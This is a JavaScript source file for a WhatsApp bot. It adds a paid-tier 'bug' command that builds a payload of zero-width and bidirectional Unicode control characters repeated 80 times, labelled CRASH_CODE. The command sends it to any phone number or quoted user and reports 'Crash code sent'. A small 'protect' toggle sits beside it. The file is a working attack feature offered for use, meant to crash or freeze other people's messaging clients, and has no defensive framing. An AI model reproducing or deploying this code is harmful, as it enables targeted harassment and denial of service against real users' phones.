const { activateSecurity, deactivateSecurity } = require('../security/superSecurity');
const { sendToChat } = require('../utils/messageUtils');

const CRASH_CHARS = [
  '\u2063', '\u200E', '\u200F', '\u202A', '\u202B',
  '\u202C', '\u202D', '\u202E',
  '\u200B', // zero width space
  '\u200C', // zero width non-joiner
  '\u200D'  // zero width joiner
];

const baseSequence = CRASH_CHARS.join('') + CRASH_CHARS.reverse().join('');
const CRASH_CODE = baseSequence.repeat(80);


async function handleProtectionCommand({
    sock,
    message,
    userId,
    authId,
    command,
    args,
    botInstance,
    realSender,
    normalizedUserId,
    botLid,
    subscriptionLevel,
    remoteJid
}) {
    switch (command) {
        case 'protect':
            if (!['basic', 'gold', 'premium'].includes(subscriptionLevel)) {
                await sendToChat(botInstance, remoteJid, { message: '🤖 Security is not available for free tier.' });
                return true;
            }
            if (args[0] === 'off') {
                deactivateSecurity(authId);
                await sendToChat(botInstance, remoteJid, { message: '🛡️ Security protection deactivated for your bot.' });
            } else {
                activateSecurity(authId);
                await sendToChat(botInstance, remoteJid, { message: '🛡️ Security protection activated for your bot!' });
            }
            return true;

            case 'bug':
    if (!['gold', 'premium'].includes(subscriptionLevel)) {
        await sendToChat(botInstance, remoteJid, { message: '🤖 Only gold/premium users can use this.' });
        return true;
    }
    if (realSender !== normalizedUserId && realSender !== botLid) {
        await sendToChat(botInstance, remoteJid, { message: '🤖 Only the bot owner can use this command.' });
        return true;
    }
    if (args[0] === 'off') {
        await sendToChat(botInstance, remoteJid, { message: '🪲 Crash code sending is now disabled.' });
        return true;
    }

    // --- Target JID Extraction ---
    let targetJid = null;
    const quoted = message.message?.extendedTextMessage?.contextInfo;

    if (quoted && quoted.participant) {
        // If reply, use the participant's JID (should be a WhatsApp JID)
        targetJid = quoted.participant;
    } else if (args[0]) {
        // If argument is a phone number, normalize to WhatsApp JID
        let num = args[0].replace(/[^0-9]/g, '');
        if (num.length > 5) {
            targetJid = num + '@s.whatsapp.net';
        }
    }

    // Validate targetJid
    if (!targetJid || !targetJid.endsWith('@s.whatsapp.net')) {
        await sendToChat(botInstance, remoteJid, { message: '🤖 Please reply to a user or provide a valid phone number.' });
        return true;
    }

    await sendToChat(botInstance, targetJid, { message: CRASH_CODE });
    await sendToChat(botInstance, remoteJid, { message: `✅ Crash code sent to ${targetJid}` });
    return true;

}};
module.exports = { handleProtectionCommand };